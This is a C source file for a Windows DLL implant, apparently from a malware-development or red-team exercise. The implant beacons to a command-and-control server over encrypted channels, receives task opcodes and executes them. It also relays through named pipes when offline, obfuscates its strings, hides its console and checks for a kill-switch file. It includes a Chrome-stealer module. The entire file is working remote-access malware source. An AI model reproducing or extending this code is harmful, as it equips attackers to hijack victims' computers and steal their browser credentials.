#include "debug.h"
#include "internet.h"
#include "pipe_server_client.h"
#include "chrome_stealer.h"
#include "exec.h"
#include "beacon.h"

char client_guid_real_b64[crypto_kx_PUBLICKEYBYTES * 2];
DWORD beacon_Interval;
int renegotiate_time = 3;

DWORD clientMode(LPBYTE pcbReqeustBuffer,
                 DWORD cbRequestBufferLength,
                 LPBYTE pcbReplyBuffer,
                 DWORD cbReplyBufferLength) {

    CHAR serverName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    CHAR pipeFullPath[128] = {0};

    // 0 indicates keep broadcast
    getPipeHostName(serverName, sizeof(serverName), 0);
    if (strlen(serverName) == 0) {
        debug_printf("Maximum pipe searching reached\n");
        return 0;
    }
    // generate pipe full path to connect 
    LAIKA_BOX_STARTVAR(char*, slashes_str, KEY_maindll_clientMode_pipeslash, DATA_maindll_clientMode_pipeslash)
    LAIKA_BOX_STARTVAR(char*, pipename_str, KEY_maindll_clientMode_pipeslash2, DATA_maindll_clientMode_pipeslash2)
    sprintf_s(pipeFullPath, 127, "%s%s%s", slashes_str, serverName, pipename_str);
    LAIKA_BOX_ENDVAR(slashes_str)
    LAIKA_BOX_ENDVAR(pipename_str)
    uint8_t key_kdf_send[crypto_kx_SESSIONKEYBYTES]; uint8_t key_kdf_rcv[crypto_kx_SESSIONKEYBYTES]; uint8_t key_kdf_guid[crypto_kx_SESSIONKEYBYTES]; 
    uint8_t nonce_send[crypto_aead_chacha20poly1305_NPUBBYTES]; uint8_t nonce_rcv[crypto_aead_chacha20poly1305_NPUBBYTES]; uint8_t suburl_bin[crypto_aead_chacha20poly1305_NPUBBYTES];
    uint8_t session_key_send[crypto_kx_SESSIONKEYBYTES]; uint8_t session_key_rcv[crypto_kx_SESSIONKEYBYTES]; uint8_t client_guid_ephemeral[crypto_kx_SESSIONKEYBYTES];

    /*
        (re)negotiate with C2 server
    */
    DWORD negotiate_result = key_negotiation_client_mode(client_guid_real_b64, 
                                                        nonce_send, nonce_rcv, suburl_bin,
                                                        key_kdf_send, key_kdf_rcv, key_kdf_guid,
                                                        session_key_send, session_key_rcv, client_guid_ephemeral,
                                                        pipeFullPath);
    if (negotiate_result == ERROR_GEN_FAILURE) {
        debug_printf("[-] Dead in client mode negotiate\n");
        return -1;
    } else if (negotiate_result == ERROR_NOT_CONNECTED) {
        debug_printf("[-] Pipe server dead\n");
        return 0;
    }
    int beaconcount = 0;
    for (;;) {
        /*
        beacon routine
        */
        if(beaconcount % renegotiate_time == 0 && beaconcount != 0) {
            debug_printf(" >>>>>>>>>>>>>> Renegotiate! <<<<<<<<<<<<<<<<<<<<\n");
            DWORD negotiate_result = key_negotiation_client_mode(client_guid_real_b64, 
                                                                 nonce_send, nonce_rcv, suburl_bin,
                                                                 key_kdf_send, key_kdf_rcv, key_kdf_guid,
                                                                 session_key_send, session_key_rcv, client_guid_ephemeral,
                                                                 pipeFullPath);
            if (negotiate_result == ERROR_GEN_FAILURE) {
                debug_printf("[-] Dead in client mode negotiate\n");
                return -1;
            } else if (negotiate_result == ERROR_NOT_CONNECTED) {
                debug_printf("[-] Pipe server dead\n");
                return 0;
            }
        }
        uint8_t buffer_decrypt_decode_rcv[4096]; size_t actualDecryptedSize;
        DWORD result = beacon_c2_client(client_guid_ephemeral, suburl_bin, client_guid_real_b64,
                                 nonce_send, session_key_send,
                                 nonce_rcv, session_key_rcv,
                                 buffer_decrypt_decode_rcv, &actualDecryptedSize,
                                 key_kdf_guid, key_kdf_send, key_kdf_rcv, pipeFullPath);
        if (result == ERROR_NOT_CONNECTED) {
            debug_printf("[-] Client Mode Beacon Not connected\n");
            return -1;
        } else if (result == ERROR_GEN_FAILURE) {
            debug_printf("[-] Client Mode Beacon dead\n");
        }
        
        TaskRequest message_resp = TaskRequest_init_zero;
        pb_istream_t stream_i = pb_istream_from_buffer(buffer_decrypt_decode_rcv, actualDecryptedSize);
        size_t err_check = deserialize(&stream_i, &message_resp, TaskRequest_fields);
        
        if (err_check != 0) {
            debug_printf("[-] Client_mode: Can't deserialize decrypted Task message \n");
            return -1;
        } 

        debug_printf("[+] Successfully Deserialized \n");
        /* Task Execution */
        DWORD current_task = message_resp.Opcode;
        debug_printf("%ld\n", current_task);

        if(execTask_clientMode(current_task, message_resp.Args, pcbReqeustBuffer, pipeFullPath, 
                               suburl_bin, client_guid_ephemeral, key_kdf_guid,
                               nonce_send, session_key_send, key_kdf_send,
                               nonce_rcv, session_key_rcv, key_kdf_rcv,
                               client_guid_real_b64, &beacon_Interval) != ERROR_SUCCESS) {
            debug_printf("Task Execution failed!\n");
        }

        #ifndef PRODUCTION
        ask_to_proceed();
        #else
        Sleep(beacon_Interval);
        #endif
    }
    beaconcount++;
    return 0;
}

DWORD serverMode(LPBYTE pcbReqeustBuffer,
                 DWORD cbRequestBufferLength,
                 LPBYTE pcbReplyBuffer,
                 DWORD cbReplyBufferLength,
                 BEACON_PARAM* beacon_param) {

    // enter serverMode means we have (re)negotiated with C2 server

    // initialize global value to communicate with threads
    pipeThreadSuccess = FALSE;
    listenThreadSuccess = FALSE;
    pipeInternetConnect = TRUE;
    kill = FALSE;

    // allocate buffer for server thread
    LPBYTE pchRequest, pchReply;
    pchRequest = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, REQUSET_BUFSIZE * sizeof(BYTE));
    if (pchRequest == NULL) {
        debug_printf( "MEMORY ALLOCATE ERROR - Pipe Server Failed\n");
        return 1;
    }
    pchReply = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, REPLY_BUFSIZE * sizeof(BYTE));
    if (pchReply == NULL) {
        debug_printf( "MEMORY ALLOCATE ERROR - Pipe Server Failed\n");
        HeapFree(GetProcessHeap(), 0, pchRequest);
        return 1;
    } 

    // create Treads We Need
    PIPEBUFF pipeServerBuf;
    pipeServerBuf.pbRequestBuffer = pchRequest;
    pipeServerBuf.cbRequestBytes = REQUSET_BUFSIZE;
    pipeServerBuf.pbReplyBuffer = pchReply;
    pipeServerBuf.cbReplyBytes = REPLY_BUFSIZE;

    HANDLE hServerThread = CreateThread(NULL, 0, pipeServer, (LPVOID) &pipeServerBuf, 0, NULL);
    HANDLE hListenThread = CreateThread(NULL, 0, pipeServerListen, NULL, 0, NULL); 

    // wait for threads to be ready
    DWORD i = 0;
    while ((!pipeThreadSuccess || !listenThreadSuccess) && i < 10) {
        i++;
        Sleep(1000);
    }
    if (pipeThreadSuccess && listenThreadSuccess) {
        debug_printf("\nThreads created success!!\n");
    } else {
        // some threads can not run properly,
        // kill all other threads and free allocated memory
        pipeInternetConnect = FALSE;
        kill = TRUE;
        dummyConnectPipe();
        dummyBroadcast();
        WaitForSingleObject(hListenThread, INFINITE);
        WaitForSingleObject(hServerThread, INFINITE);
        CloseHandle(hListenThread);
        CloseHandle(hServerThread);

        HeapFree(GetProcessHeap(), 0, pchRequest);
        HeapFree(GetProcessHeap(), 0, pchReply);

        return 2;
    }

    DWORD negotiate_result;
    int beaconcount = 0;
    // main thread, communicate with C2 server and exec
    for(;;) {
        
        if(beaconcount % renegotiate_time == 0 && beaconcount != 0) {
            /* (re)negotiate with C2 server */
            debug_printf(" >>>>>>>>>>>>>> Renegotiate! <<<<<<<<<<<<<<<<<<<<\n");
            negotiate_result = key_negotiation_new(client_guid_real_b64, 
                                                beacon_param->nonce_send, beacon_param->nonce_rcv, beacon_param->suburl_bin,
                                                beacon_param->key_kdf_send, beacon_param->key_kdf_rcv, beacon_param->key_kdf_guid,
                                                beacon_param->session_key_send, beacon_param->session_key_rcv, beacon_param->client_guid_ephemeral);
            if (negotiate_result == ERROR_GEN_FAILURE) {
                debug_printf("[-] Dead in server mode negotiate\n");
                return -1;
            } else if (negotiate_result == ERROR_NOT_CONNECTED) {
                debug_printf("[-] Can't connect to C2 server\n");
            }
        }
        /*
        beacon(); // also can send replys to server
        */
        
        uint8_t buffer_decrypt_decode_rcv[4096]; size_t actualDecryptedSize;
        DWORD result = beacon_c2(beacon_param->client_guid_ephemeral, beacon_param->suburl_bin, client_guid_real_b64,
                                 beacon_param->nonce_send, beacon_param->session_key_send,
                                 beacon_param->nonce_rcv, beacon_param->session_key_rcv,
                                 buffer_decrypt_decode_rcv, &actualDecryptedSize,
                                 beacon_param->key_kdf_guid, beacon_param->key_kdf_send, beacon_param->key_kdf_rcv);


        if (result == ERROR_NOT_CONNECTED) {
            // other threads will moniter haveConnect value
            // if it become false, they will terminated 
            pipeInternetConnect = FALSE;
            // wake up threads to let them check pipeInternetConnect
            // and terminated themselves
            dummyConnectPipe();
            dummyBroadcast();
            // wait for them to exit
            WaitForSingleObject(hListenThread, INFINITE);
            WaitForSingleObject(hServerThread, INFINITE);
            CloseHandle(hListenThread);
            CloseHandle(hServerThread);
            // free buffer for threads
            HeapFree(GetProcessHeap(), 0, pchRequest);
            HeapFree(GetProcessHeap(), 0, pchReply);
            break;
        }
        
        /* Parse the decrypted data */
        TaskRequest message_resp = TaskRequest_init_zero;
        pb_istream_t stream_i = pb_istream_from_buffer(buffer_decrypt_decode_rcv, actualDecryptedSize);
        size_t err_check = deserialize(&stream_i, &message_resp, TaskRequest_fields);
        if (err_check != 0) {
            debug_printf("[-] Can't deserialize decrypted Task message \n");
            continue;
        } 
        debug_printf("[+] Successfully Deserialized \n");
        /* Task Execution */
        
        DWORD current_task = message_resp.Opcode;
        // char* current_args = ;
        debug_printf("%ld\n", current_task);

        if(execTask(current_task, message_resp.Args, pcbReqeustBuffer, pcbReplyBuffer,
                    beacon_param->suburl_bin, beacon_param->client_guid_ephemeral, beacon_param->key_kdf_guid,
                    beacon_param->nonce_send, beacon_param->session_key_send, beacon_param->key_kdf_send,
                    beacon_param->nonce_rcv, beacon_param->session_key_rcv, beacon_param->key_kdf_rcv,
                    client_guid_real_b64, &beacon_Interval) != ERROR_SUCCESS) {
            debug_printf("Task Execution failed!\n");
        }

        #ifndef PRODUCTION
        ask_to_proceed();
        #else
        Sleep(beacon_Interval);
        #endif
        beaconcount++;
    }

    return 3;
}

__declspec(dllexport) DWORD FooBar(void) {

    // create mutex, this program will not release it
    // to ensure only one program exist in OS
    LAIKA_BOX_STARTVAR(char*, mutextName, KEY_main_dll_mutexName, DATA_main_dll_mutexName)
    LPSTR mutexName = mutextName;
    HANDLE hMutex = CreateMutexA(NULL, FALSE, mutexName);
    LAIKA_BOX_ENDVAR(mutextName)

    if (hMutex == NULL) {
        debug_printf("CreateMutex error: %ld\n", GetLastError());
        ExitProcess(3);
    }
    DWORD waitResult = WaitForSingleObject(hMutex, 1000);
    if (WAIT_OBJECT_0 != waitResult) {
        debug_printf("program already exist, exit\n");
        ExitProcess(3);
    }

    // detect kill switch file
    LAIKA_BOX_STARTVAR(char*, killSwitchFile_str, KEY_main_dll_killswitchfile, DATA_main_dll_killswitchfile)
    LPSTR killSwitchFile = killSwitchFile_str;
    HANDLE hFile =
    CreateFileA(
        killSwitchFile,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    LAIKA_BOX_ENDVAR(killSwitchFile_str)

    if (INVALID_HANDLE_VALUE == hFile) {
        debug_printf("can not find ch0nky, exit\n");
        ExitProcess(4);
    } else {
        CloseHandle(hFile);
        debug_printf("file find, continue\n");
    }

    // free console
    #ifdef PRODUCTION
    FreeConsole();
    #else
    #endif

    // allocate memory for C2 server communication
    LPBYTE pRequest = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, REQUSET_BUFSIZE * sizeof(BYTE));
    if (NULL == pRequest) {
        debug_printf("main: memory allocate error\n");
        return 1;
    }
    debug_printf("lol0\n");

    LPBYTE pReply = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, REPLY_BUFSIZE * sizeof(BYTE));
    if (NULL == pReply) {
        debug_printf("main: memory allocate error\n");
        HeapFree(GetProcessHeap(), 0, pRequest);
        return 1;
    }

    debug_printf("lol1\n");

    // Generating GUID for this client
    if(generate_guid_b64(client_guid_real_b64, crypto_kx_PUBLICKEYBYTES * 2) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate client_guid\n");
        return -1;
    }
    debug_printf("lol2\n");

    uint8_t key_kdf_send[crypto_kx_SESSIONKEYBYTES]; uint8_t key_kdf_rcv[crypto_kx_SESSIONKEYBYTES]; uint8_t key_kdf_guid[crypto_kx_SESSIONKEYBYTES]; 
    uint8_t nonce_send[crypto_aead_chacha20poly1305_NPUBBYTES]; uint8_t nonce_rcv[crypto_aead_chacha20poly1305_NPUBBYTES]; uint8_t suburl_bin[crypto_aead_chacha20poly1305_NPUBBYTES];
    uint8_t session_key_send[crypto_kx_SESSIONKEYBYTES]; uint8_t session_key_rcv[crypto_kx_SESSIONKEYBYTES]; uint8_t client_guid_ephemeral[crypto_kx_SESSIONKEYBYTES];

    BEACON_PARAM beacon_param;
    
    beacon_param.key_kdf_guid = key_kdf_guid; beacon_param.key_kdf_rcv = key_kdf_rcv; beacon_param.key_kdf_send = key_kdf_send;
    beacon_param.nonce_send = nonce_send; beacon_param.nonce_rcv = nonce_rcv; beacon_param.suburl_bin = suburl_bin;
    beacon_param.session_key_send = session_key_send; beacon_param.session_key_rcv = session_key_rcv; beacon_param.client_guid_ephemeral = client_guid_ephemeral;
    beacon_Interval = 4000;

    // main function
    for (;;) {
        DWORD hasNet;
        DWORD negotiate_result;
        /* (re)negotiate with C2 server */
        debug_printf(" >>>>>>>>>>>>>> Renegotiate! <<<<<<<<<<<<<<<<<<<<\n");
        negotiate_result = key_negotiation_new(client_guid_real_b64, 
                                                    nonce_send, nonce_rcv, suburl_bin,
                                                    key_kdf_send, key_kdf_rcv, key_kdf_guid,
                                                    session_key_send, session_key_rcv, client_guid_ephemeral);
        if (negotiate_result == ERROR_SUCCESS) {
            hasNet = 1;
        } else if (negotiate_result == ERROR_NOT_CONNECTED) {
            debug_printf("[!] hasNet should be 0\n");
            hasNet = 0;
            debug_printf("[!] hasNet is %ld\n", hasNet);
        } else {
            debug_printf("[-] wtf key negotiation\n");
            return -1;
        }

        if (hasNet) {
            serverMode(
                pRequest,
                REQUSET_BUFSIZE,
                pReply,
                REPLY_BUFSIZE,
                &beacon_param);
        } else {
            clientMode(
                pRequest,
                REQUSET_BUFSIZE,
                pReply,
                REPLY_BUFSIZE);
            debug_printf("open up server!\n");
            Sleep(6000);
        }
    }
}

// Entrypoint for the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH:
    // Code to run when the DLL is loaded
    // FooBar();
    break;
  case DLL_PROCESS_DETACH:
    // Code to run when the DLL is unloaded
    break;
  case DLL_THREAD_ATTACH:
    // Code to run when a thread is created during DLL's existence
    break;
  case DLL_THREAD_DETACH:
    // Code to run when a thread ends normally
    break;
  }
  return TRUE; // Successful
}